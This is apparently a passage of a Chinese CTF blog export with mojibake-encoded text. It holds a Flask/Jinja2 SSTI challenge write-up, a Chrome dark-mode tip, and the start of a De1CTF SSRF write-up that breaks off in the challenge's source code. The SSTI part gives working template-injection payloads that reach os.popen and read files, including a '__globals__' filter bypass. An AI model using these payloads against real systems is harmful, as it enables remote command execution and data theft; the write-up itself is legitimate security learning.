type &#x27;zipimport.zipimporter&#x27;</span><br><span class="line">56. type &#x27;posix.stat_result&#x27;</span><br><span class="line">57. type &#x27;posix.statvfs_result&#x27;</span><br><span class="line">58. class &#x27;warnings.WarningMessage&#x27;</span><br><span class="line">59. class &#x27;warnings.catch_warnings&#x27;</span><br><span class="line">60. class &#x27;_weakrefset._IterationGuard&#x27;</span><br><span class="line">61. class &#x27;_weakrefset.WeakSet&#x27;</span><br><span class="line">62. class &#x27;_abcoll.Hashable&#x27;</span><br><span class="line">63. type &#x27;classmethod&#x27;</span><br><span class="line">64. class &#x27;_abcoll.Iterable&#x27;</span><br><span class="line">65. class &#x27;_abcoll.Sized&#x27;</span><br><span class="line">66. class &#x27;_abcoll.Container&#x27;</span><br><span class="line">67. class &#x27;_abcoll.Callable&#x27;</span><br><span class="line">68. type &#x27;dict_keys&#x27;</span><br><span class="line">69. type &#x27;dict_items&#x27;</span><br><span class="line">70. type &#x27;dict_values&#x27;</span><br><span class="line">71. class &#x27;site._Printer&#x27;</span><br><span class="line">72. class &#x27;site._Helper&#x27;</span><br><span class="line">73. type &#x27;_sre.SRE_Pattern&#x27;</span><br><span class="line">74. type &#x27;_sre.SRE_Match&#x27;</span><br><span class="line">75. type &#x27;_sre.SRE_Scanner&#x27;</span><br><span class="line">76. class &#x27;site.Quitter&#x27;</span><br><span class="line">77. class &#x27;codecs.IncrementalEncoder&#x27;</span><br><span class="line">78. class &#x27;codecs.IncrementalDecoder&#x27;</span><br><span class="line">79. class &#x27;string.Template&#x27;</span><br><span class="line">80. class &#x27;string.Formatter&#x27;</span><br><span class="line">81. type &#x27;collections.deque&#x27;</span><br><span class="line">82. type &#x27;deque_iterator&#x27;</span><br><span class="line">83. type &#x27;deque_reverse_iterator&#x27;</span><br><span class="line">84. type &#x27;operator.itemgetter&#x27;</span><br><span class="line">85. type &#x27;operator.attrgetter&#x27;</span><br><span class="line">86. type &#x27;operator.methodcaller&#x27;</span><br><span class="line">87. type &#x27;itertools.combinations&#x27;</span><br><span class="line">88. type &#x27;itertools.combinations_with_replacement&#x27;</span><br><span class="line">89. type &#x27;itertools.cycle&#x27;</span><br><span class="line">90. type &#x27;itertools.dropwhile&#x27;</span><br><span class="line">91. type &#x27;itertools.takewhile&#x27;</span><br><span class="line">92. type &#x27;itertools.islice&#x27;</span><br><span class="line">93. type &#x27;itertools.starmap&#x27;</span><br><span class="line">94. type &#x27;itertools.imap&#x27;</span><br><span class="line">95. type &#x27;itertools.chain&#x27;</span><br><span class="line">96. type &#x27;itertools.compress&#x27;</span><br><span class="line">97. type &#x27;itertools.ifilter&#x27;</span><br><span class="line">98. type &#x27;itertools.ifilterfalse&#x27;</span><br><span class="line">99. type &#x27;itertools.count&#x27;</span><br><span class="line">100. type &#x27;itertools.izip&#x27;</span><br><span class="line">101. type &#x27;itertools.izip_longest&#x27;</span><br><span class="line">102. type &#x27;itertools.permutations&#x27;</span><br><span class="line">103. type &#x27;itertools.product&#x27;</span><br><span class="line">104. type &#x27;itertools.repeat&#x27;</span><br><span class="line">105. type &#x27;itertools.groupby&#x27;</span><br><span class="line">106. type &#x27;itertools.tee_dataobject&#x27;</span><br><span class="line">107. type &#x27;itertools.tee&#x27;</span><br><span class="line">108. type &#x27;itertools._grouper&#x27;</span><br><span class="line">109. type &#x27;_thread._localdummy&#x27;</span><br><span class="line">110. type &#x27;thread._local&#x27;</span><br><span class="line">111. type &#x27;thread.lock&#x27;</span><br><span class="line">112. type &#x27;method_descriptor&#x27;</span><br><span class="line">113. class &#x27;markupsafe._MarkupEscapeHelper&#x27;</span><br><span class="line">114. type &#x27;_io._IOBase&#x27;</span><br><span class="line">115. type &#x27;_io.IncrementalNewlineDecoder&#x27;</span><br><span class="line">116. type &#x27;_hashlib.HASH&#x27;</span><br><span class="line">117. type &#x27;_random.Random&#x27;</span><br><span class="line">118. type &#x27;cStringIO.StringO&#x27;</span><br><span class="line">119. type &#x27;cStringIO.StringI&#x27;</span><br><span class="line">120. type &#x27;cPickle.Unpickler&#x27;</span><br><span class="line">121. type &#x27;cPickle.Pickler&#x27;</span><br><span class="line">122. type &#x27;functools.partial&#x27;</span><br><span class="line">123. type &#x27;_ssl._SSLContext&#x27;</span><br><span class="line">124. type &#x27;_ssl._SSLSocket&#x27;</span><br><span class="line">125. class &#x27;socket._closedsocket&#x27;</span><br><span class="line">126. type &#x27;_socket.socket&#x27;</span><br><span class="line">127. class &#x27;socket._socketobject&#x27;</span><br><span class="line">128. class &#x27;socket._fileobject&#x27;</span><br><span class="line">129. type &#x27;time.struct_time&#x27;</span><br><span class="line">130. type &#x27;Struct&#x27;</span><br><span class="line">131. class &#x27;urlparse.ResultMixin&#x27;</span><br><span class="line">132. class &#x27;contextlib.GeneratorContextManager&#x27;</span><br><span class="line">133. class &#x27;contextlib.closing&#x27;</span><br><span class="line">134. type &#x27;_json.Scanner&#x27;</span><br><span class="line">135. type &#x27;_json.Encoder&#x27;</span><br><span class="line">136. class &#x27;json.decoder.JSONDecoder&#x27;</span><br><span class="line">137. class &#x27;json.encoder.JSONEncoder&#x27;</span><br><span class="line">138. class &#x27;threading._Verbose&#x27;</span><br><span class="line">139. class &#x27;jinja2.utils.MissingType&#x27;</span><br><span class="line">140. class &#x27;jinja2.utils.LRUCache&#x27;</span><br><span class="line">141. class &#x27;jinja2.utils.Cycler&#x27;</span><br><span class="line">142. class &#x27;jinja2.utils.Joiner&#x27;</span><br><span class="line">143. class &#x27;jinja2.utils.Namespace&#x27;</span><br><span class="line">144. class &#x27;jinja2.bccache.Bucket&#x27;</span><br><span class="line">145. class &#x27;jinja2.bccache.BytecodeCache&#x27;</span><br><span class="line">146. class &#x27;jinja2.nodes.EvalContext&#x27;</span><br><span class="line">147. class &#x27;jinja2.visitor.NodeVisitor&#x27;</span><br><span class="line">148. class &#x27;jinja2.nodes.Node&#x27;</span><br><span class="line">149. class &#x27;jinja2.idtracking.Symbols&#x27;</span><br><span class="line">150. class &#x27;jinja2.compiler.MacroRef&#x27;</span><br><span class="line">151. class &#x27;jinja2.compiler.Frame&#x27;</span><br><span class="line">152. class &#x27;jinja2.runtime.TemplateReference&#x27;</span><br><span class="line">153. class &#x27;numbers.Number&#x27;</span><br><span class="line">154. class &#x27;jinja2.runtime.Context&#x27;</span><br><span class="line">155. class &#x27;jinja2.runtime.BlockReference&#x27;</span><br><span class="line">156. class &#x27;jinja2.runtime.Macro&#x27;</span><br><span class="line">157. class &#x27;jinja2.runtime.Undefined&#x27;</span><br><span class="line">158. class &#x27;decimal.Decimal&#x27;</span><br><span class="line">159. class &#x27;decimal._ContextManager&#x27;</span><br><span class="line">160. class &#x27;decimal.Context&#x27;</span><br><span class="line">161. class &#x27;decimal._WorkRep&#x27;</span><br><span class="line">162. class &#x27;decimal._Log10Memoize&#x27;</span><br><span class="line">163. type &#x27;_ast.AST&#x27;</span><br><span class="line">164. class &#x27;ast.NodeVisitor&#x27;</span><br><span class="line">165. class &#x27;jinja2.lexer.Failure&#x27;</span><br><span class="line">166. class &#x27;jinja2.lexer.TokenStreamIterator&#x27;</span><br><span class="line">167. class &#x27;jinja2.lexer.TokenStream&#x27;</span><br><span class="line">168. class &#x27;jinja2.lexer.Lexer&#x27;</span><br><span class="line">169. class &#x27;jinja2.parser.Parser&#x27;</span><br><span class="line">170. class &#x27;jinja2.environment.Environment&#x27;</span><br><span class="line">171. class &#x27;jinja2.environment.Template&#x27;</span><br><span class="line">172. class &#x27;jinja2.environment.TemplateModule&#x27;</span><br><span class="line">173. class &#x27;jinja2.environment.TemplateExpression&#x27;</span><br><span class="line">174. class &#x27;jinja2.environment.TemplateStream&#x27;</span><br><span class="line">175. class &#x27;jinja2.loaders.BaseLoader&#x27;</span><br><span class="line">176. type &#x27;datetime.date&#x27;</span><br><span class="line">177. type &#x27;datetime.timedelta&#x27;</span><br><span class="line">178. type &#x27;datetime.time&#x27;</span><br><span class="line">179. type &#x27;datetime.tzinfo&#x27;</span><br><span class="line">180. class &#x27;logging.LogRecord&#x27;</span><br><span class="line">181. class &#x27;logging.Formatter&#x27;</span><br><span class="line">182. class &#x27;logging.BufferingFormatter&#x27;</span><br><span class="line">183. class &#x27;logging.Filter&#x27;</span><br><span class="line">184. class &#x27;logging.Filterer&#x27;</span><br><span class="line">185. class &#x27;logging.PlaceHolder&#x27;</span><br><span class="line">186. class &#x27;logging.Manager&#x27;</span><br><span class="line">187. class &#x27;logging.LoggerAdapter&#x27;</span><br><span class="line">188. class &#x27;werkzeug._internal._Missing&#x27;</span><br><span class="line">189. class &#x27;werkzeug._internal._DictAccessorProperty&#x27;</span><br><span class="line">190. class &#x27;werkzeug.utils.HTMLBuilder&#x27;</span><br><span class="line">191. class &#x27;werkzeug.exceptions.Aborter&#x27;</span><br><span class="line">192. class &#x27;werkzeug.urls.Href&#x27;</span><br><span class="line">193. type &#x27;select.epoll&#x27;</span><br><span class="line">194. class &#x27;click._compat._FixupStream&#x27;</span><br><span class="line">195. class &#x27;click._compat._AtomicFile&#x27;</span><br><span class="line">196. class &#x27;click.utils.LazyFile&#x27;</span><br><span class="line">197. class &#x27;click.utils.KeepOpenFile&#x27;</span><br><span class="line">198. class &#x27;click.utils.PacifyFlushWrapper&#x27;</span><br><span class="line">199. class &#x27;click.parser.Option&#x27;</span><br><span class="line">200. class &#x27;click.parser.Argument&#x27;</span><br><span class="line">201. class &#x27;click.parser.ParsingState&#x27;</span><br><span class="line">202. class &#x27;click.parser.OptionParser&#x27;</span><br><span class="line">203. class &#x27;click.types.ParamType&#x27;</span><br><span class="line">204. class &#x27;click.formatting.HelpFormatter&#x27;</span><br><span class="line">205. class &#x27;click.core.Context&#x27;</span><br><span class="line">206. class &#x27;click.core.BaseCommand&#x27;</span><br><span class="line">207. class &#x27;click.core.Parameter&#x27;</span><br><span class="line">208. class &#x27;werkzeug.serving.WSGIRequestHandler&#x27;</span><br><span class="line">209. class &#x27;werkzeug.serving._SSLContext&#x27;</span><br><span class="line">210. class &#x27;werkzeug.serving.BaseWSGIServer&#x27;</span><br><span class="line">211. class &#x27;werkzeug.datastructures.ImmutableListMixin&#x27;</span><br><span class="line">212. class &#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;</span><br><span class="line">213. class &#x27;werkzeug.datastructures.UpdateDictMixin&#x27;</span><br><span class="line">214. class &#x27;werkzeug.datastructures.ViewItems&#x27;</span><br><span class="line">215. class &#x27;werkzeug.datastructures._omd_bucket&#x27;</span><br><span class="line">216. class &#x27;werkzeug.datastructures.Headers&#x27;</span><br><span class="line">217. class &#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;</span><br><span class="line">218. class &#x27;werkzeug.datastructures.IfRange&#x27;</span><br><span class="line">219. class &#x27;werkzeug.datastructures.Range&#x27;</span><br><span class="line">220. class &#x27;werkzeug.datastructures.ContentRange&#x27;</span><br><span class="line">221. class &#x27;werkzeug.datastructures.FileStorage&#x27;</span><br><span class="line">222. class &#x27;email.LazyImporter&#x27;</span><br><span class="line">223. class &#x27;calendar.Calendar&#x27;</span><br><span class="line">224. class &#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;</span><br><span class="line">225. class &#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;</span><br><span class="line">226. class &#x27;werkzeug.wrappers.auth.WWWAuthenticateMixin&#x27;</span><br><span class="line">227. class &#x27;werkzeug.wsgi.ClosingIterator&#x27;</span><br><span class="line">228. class &#x27;werkzeug.wsgi.FileWrapper&#x27;</span><br><span class="line">229. class &#x27;werkzeug.wsgi._RangeWrapper&#x27;</span><br><span class="line">230. class &#x27;werkzeug.formparser.FormDataParser&#x27;</span><br><span class="line">231. class &#x27;werkzeug.formparser.MultiPartParser&#x27;</span><br><span class="line">232. class &#x27;werkzeug.wrappers.base_request.BaseRequest&#x27;</span><br><span class="line">233. class &#x27;werkzeug.wrappers.base_response.BaseResponse&#x27;</span><br><span class="line">234. class &#x27;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#x27;</span><br><span class="line">235. class &#x27;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#x27;</span><br><span class="line">236. class &#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;</span><br><span class="line">237. class &#x27;werkzeug.wrappers.etag.ETagResponseMixin&#x27;</span><br><span class="line">238. class &#x27;werkzeug.wrappers.cors.CORSRequestMixin&#x27;</span><br><span class="line">239. class &#x27;werkzeug.wrappers.cors.CORSResponseMixin&#x27;</span><br><span class="line">240. class &#x27;werkzeug.useragents.UserAgentParser&#x27;</span><br><span class="line">241. class &#x27;werkzeug.useragents.UserAgent&#x27;</span><br><span class="line">242. class &#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;</span><br><span class="line">243. class &#x27;werkzeug.wrappers.request.StreamOnlyMixin&#x27;</span><br><span class="line">244. class &#x27;werkzeug.wrappers.response.ResponseStream&#x27;</span><br><span class="line">245. class &#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;</span><br><span class="line">246. class &#x27;werkzeug.test._TestCookieHeaders&#x27;</span><br><span class="line">247. class &#x27;werkzeug.test._TestCookieResponse&#x27;</span><br><span class="line">248. class &#x27;werkzeug.test.EnvironBuilder&#x27;</span><br><span class="line">249. class &#x27;werkzeug.test.Client&#x27;</span><br><span class="line">250. class &#x27;uuid.UUID&#x27;</span><br><span class="line">251. type &#x27;CArgObject&#x27;</span><br><span class="line">252. type &#x27;_ctypes.CThunkObject&#x27;</span><br><span class="line">253. type &#x27;_ctypes._CData&#x27;</span><br><span class="line">254. type &#x27;_ctypes.CField&#x27;</span><br><span class="line">255. type &#x27;_ctypes.DictRemover&#x27;</span><br><span class="line">256. class &#x27;ctypes.CDLL&#x27;</span><br><span class="line">257. class &#x27;ctypes.LibraryLoader&#x27;</span><br><span class="line">258. class &#x27;subprocess.Popen&#x27;</span><br><span class="line">259. class &#x27;itsdangerous._json._CompactJSON&#x27;</span><br><span class="line">260. class &#x27;itsdangerous.signer.SigningAlgorithm&#x27;</span><br><span class="line">261. class &#x27;itsdangerous.signer.Signer&#x27;</span><br><span class="line">262. class &#x27;itsdangerous.serializer.Serializer&#x27;</span><br><span class="line">263. class &#x27;itsdangerous.url_safe.URLSafeSerializerMixin&#x27;</span><br><span class="line">264. class &#x27;flask._compat._DeprecatedBool&#x27;</span><br><span class="line">265. class &#x27;werkzeug.local.Local&#x27;</span><br><span class="line">266. class &#x27;werkzeug.local.LocalStack&#x27;</span><br><span class="line">267. class &#x27;werkzeug.local.LocalManager&#x27;</span><br><span class="line">268. class &#x27;werkzeug.local.LocalProxy&#x27;</span><br><span class="line">269. class &#x27;difflib.HtmlDiff&#x27;</span><br><span class="line">270. class &#x27;werkzeug.routing.RuleFactory&#x27;</span><br><span class="line">271. class &#x27;werkzeug.routing.RuleTemplate&#x27;</span><br><span class="line">272. class &#x27;werkzeug.routing.BaseConverter&#x27;</span><br><span class="line">273. class &#x27;werkzeug.routing.Map&#x27;</span><br><span class="line">274. class &#x27;werkzeug.routing.MapAdapter&#x27;</span><br><span class="line">275. class &#x27;flask.signals.Namespace&#x27;</span><br><span class="line">276. class &#x27;flask.signals._FakeSignal&#x27;</span><br><span class="line">277. class &#x27;flask.helpers.locked_cached_property&#x27;</span><br><span class="line">278. class &#x27;flask.helpers._PackageBoundObject&#x27;</span><br><span class="line">279. class &#x27;flask.cli.DispatchingApp&#x27;</span><br><span class="line">280. class &#x27;flask.cli.ScriptInfo&#x27;</span><br><span class="line">281. class &#x27;flask.config.ConfigAttribute&#x27;</span><br><span class="line">282. class &#x27;flask.ctx._AppCtxGlobals&#x27;</span><br><span class="line">283. class &#x27;flask.ctx.AppContext&#x27;</span><br><span class="line">284. class &#x27;flask.ctx.RequestContext&#x27;</span><br><span class="line">285. class &#x27;flask.json.tag.JSONTag&#x27;</span><br><span class="line">286. class &#x27;flask.json.tag.TaggedJSONSerializer&#x27;</span><br><span class="line">287. class &#x27;flask.sessions.SessionInterface&#x27;</span><br><span class="line">288. class &#x27;werkzeug.wrappers.json._JSONModule&#x27;</span><br><span class="line">289. class &#x27;werkzeug.wrappers.json.JSONMixin&#x27;</span><br><span class="line">290. class &#x27;flask.blueprints.BlueprintSetupState&#x27;</span><br><span class="line">291. type &#x27;unicodedata.UCD&#x27;</span><br><span class="line">292. class &#x27;jinja2.ext.Extension&#x27;</span><br><span class="line">293. class &#x27;jinja2.ext._CommentFinder&#x27;</span><br><span class="line">294. type &#x27;array.array&#x27;</span><br><span class="line">295. type &#x27;method-wrapper&#x27;</span><br></pre></td></tr></table></figure></p>
<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨59, 71, 40</p>
<p>ç»è¿‡æµ‹è¯•ï¼Œåå°è¿‡æ»¤äº†globalã€‚</p>
<h2 id="å‘½ä»¤æ‰§è¡Œ">å‘½ä»¤æ‰§è¡Œ</h2>
<h3 id="site._printer"><code>site._Printer</code></h3>
<p>é¦–å…ˆæŸ¥çœ‹æ˜¯å¦å†…ç½®osæ¨¡å—ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>åœ¨é¡µé¢ä¸­æ‰¾åˆ°å¦‚ä¸‹å†…å®¹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171322.png" /></p>
<p>å‘ç°å†…ç½®äº†osæ¨¡å—ï¼Œå› æ­¤ç›´æ¥å¼•ç”¨ï¼Œç„¶åæ‰§è¡Œç³»ç»Ÿå‘½ä»¤å³å¯ã€‚</p>
<p>æŸ¥çœ‹å½“å‰ç›®å½•å’Œæ ¹ç›®å½•ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171647.png" /></p>
<p>å‘ç°å½“å‰ç›®å½•å°±æ˜¯æ ¹ç›®å½•ï¼Œé‚£ä¹ˆç°åœ¨å°±éœ€è¦æ‰¾flagæ–‡ä»¶ã€‚èµ·åˆä½¿ç”¨<code>find / -name 'flag*'</code>ï¼Œå‘ç°æ²¡æœ‰æ”¶è·ï¼Œå¦‚æœé€šè¿‡æŸ¥æ‰¾å†…å®¹çš„è¯<code>grep -r -i 'flag'</code>ï¼Œæ—¶é—´å¤ªé•¿å¯¼è‡´æ— å“åº”åŒ…ã€‚å› æ­¤åªèƒ½ä¸€ä¸ªä¸€ä¸ªæ–‡ä»¶æ…¢æ…¢æ‰¾ï¼Œä¸è¿‡æœ‰ä¸€ä¸ªç›®å½•å«åš<code>flasklight</code>ï¼Œå› æ­¤å…ˆæ‰¾å®ƒã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /flasklight&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171705.png" /></p>
<p>ç¬¬äºŒä¸ªçœ‹è¿‡å»åƒæ˜¯ä¸€ä¸ªflagæ–‡ä»¶ï¼Œå…ˆç”¨ä¸‹é¢payloadæŸ¥çœ‹æ–‡ä»¶ç±»å‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;file /flasklight/coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171836.png" /></p>
<p>å‘ç°æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå› æ­¤ç›´æ¥è¯»å–å…¶å†…å®¹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;cat flasklight/coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429171916.png" /></p>
<h3 id="warnings.catch_warnings"><code>warnings.catch_warnings</code></h3>
<p>æŸ¥çœ‹æ˜¯å¦å†…ç½®osæ¨¡å—ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429172145.png" /></p>
<p>åªæ‰¾åˆ°äº†è¿™ä¹ˆä¸€å¤„ï¼Œè¯´æ˜æ²¡æœ‰å†…ç½®osï¼Œå› æ­¤éœ€è¦å¯¼å…¥ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;].__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429172642.png" /></p>
<h2 id="æ–‡ä»¶åŒ…å«-file">æ–‡ä»¶åŒ…å«-<code>file</code></h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?search=&#123;&#123;[].__class__.__base__.__subclasses__()[40](&#x27;/flasklight/coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429172827.png" /></p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>è¿™é“é¢˜è®©æˆ‘æ„Ÿè§‰åˆ°äº†ä¸¤å¤„è–„å¼±é¡¹ï¼š</p>
<ol type="1">
<li>ä¸çŸ¥é“æœ‰å“ªäº›ç±»å¯ä»¥åˆ©ç”¨</li>
<li>é‡ä¸Šè¿‡æ»¤ï¼Œä¸çŸ¥å¦‚ä½•ç»•è¿‡</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>Chrome é»‘æš—æ¨¡å¼</title>
    <url>/2022/04/07/Chrome%20%E9%BB%91%E6%9A%97%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p>è®°å½•ä¸ªäººæ—¥å¸¸ç”Ÿæ´»ä¸­é‡åˆ°çš„ç¹ççš„å°é—®é¢˜çš„è§£å†³ã€‚</p>
<span id="more"></span>
<h1 id="é—®é¢˜æè¿°">é—®é¢˜æè¿°</h1>
<p>chromeæ— è®ºæ˜¯ä¸»é¢˜è®¾ç½®ä¸º<code>Just Black</code>ï¼Œè¿˜æ˜¯åˆ©ç”¨å„ç§æ’ä»¶ï¼Œæ€»æ˜¯æœ‰ä¸æ»¡æ„çš„åœ°æ–¹ã€‚</p>
<p>å‰è€…åªæ˜¯å°†çŠ¶æ€æ ã€å·¥å…·æ ã€ä¹¦ç­¾æ å’Œæ–°æ ‡ç­¾é¡µå˜æˆé»‘æš—æ¨¡å¼ï¼Œè€Œå…¶ä»–ç½‘é¡µè¿˜æ˜¯ç™½çš„ã€‚</p>
<p>è€Œåè€…åœ¨é¡µé¢åˆ‡æ¢çš„æ—¶å€™ä¼šå…ˆè·³ä¸€ä¸‹ç™½ï¼Œç„¶åæ‰ä¼šå˜é»‘ã€‚</p>
<p>è¿™äº›é—®é¢˜å¯¹äºæˆ‘è¿™ç§å¼ºè¿«ç—‡æ‚£è€…æ˜¯ä¸èƒ½æ¥å—çš„ã€‚</p>
<h1 id="è§£å†³æ–¹æ¡ˆ">è§£å†³æ–¹æ¡ˆ</h1>
<p>æˆ‘çš„æœºå­çš„æ“ä½œç³»ç»Ÿæ˜¯ Win11ã€‚</p>
<p>ç°åœ¨æœ‰ä¸€ç§å®Œå…¨ä¸éœ€è¦æ’ä»¶å’Œä¸»é¢˜çš„é»‘æš—æ¨¡å¼ã€‚</p>
<ol type="1">
<li><p>æ‰“å¼€chromeï¼Œåœ¨åœ°å€æ è¾“å…¥<code>chrome://flags</code>ï¼Œç„¶åå›è½¦ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095058.png" /></p></li>
<li><p>æ‰¾åˆ°<code>Auto Dark Mode for Web Contents</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095132.png" /></p></li>
<li><p>ç„¶åå°†çº¢è‰²æ–¹æ¡†è®¾ç½®ä¸º<code>Enabled</code>ï¼ˆæˆ‘è¿™é‡Œå·²ç»è®¾ç½®å¥½äº†ï¼‰ï¼Œç„¶åé‡å¯å³å¯ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095215.png" /></p></li>
</ol>
<h1 id="å¯¹æ¯”">å¯¹æ¯”</h1>
<p>è¿™æ˜¯åŸæ¥åªæ”¹äº†ä¸»é¢˜çš„é»‘æš—æ¨¡å¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095502.png" /></p>
<p>è¿™æ˜¯è®¾ç½®å®Œæˆä¹‹åçš„é»‘æš—æ¨¡å¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095529.png" /></p>
<h1 id="å°é—®é¢˜">å°é—®é¢˜</h1>
<p>ä¸è¿‡è¿˜æ˜¯å­˜åœ¨ä¸€ç‚¹å°bugçš„ï¼Œçœ‹ä½ ä»¬èƒ½ä¸èƒ½æ¥å—äº†ã€‚æˆ‘å‘ç°çš„ä¸€ä¸ªå°±æ˜¯åœ¨å“”å“©å“”å“©çš„æ’­æ”¾ç•Œé¢ï¼Œé¼ æ ‡å…‰æ ‡æ”¾åˆ°è§†é¢‘ä¸Šçš„æ—¶å€™ï¼Œè§†é¢‘ä¼šæ³›ç™½ï¼Œå¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407095649.png" /></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>chrome</tag>
        <tag>dark mode</tag>
      </tags>
  </entry>
  <entry>
    <title>De1CTF 2019 SSRF Me</title>
    <url>/2022/04/11/De1CTF%202019%20SSRF%20Me/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5BDe1CTF%202019%5DSSRF%20Me">SSRF_ME</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒï¼Œçœ‹åˆ°ä¸€ä¸²ä»£ç ï¼Œå°†ä»£ç æ•´ç†ä¸€ä¸‹ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):    <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = 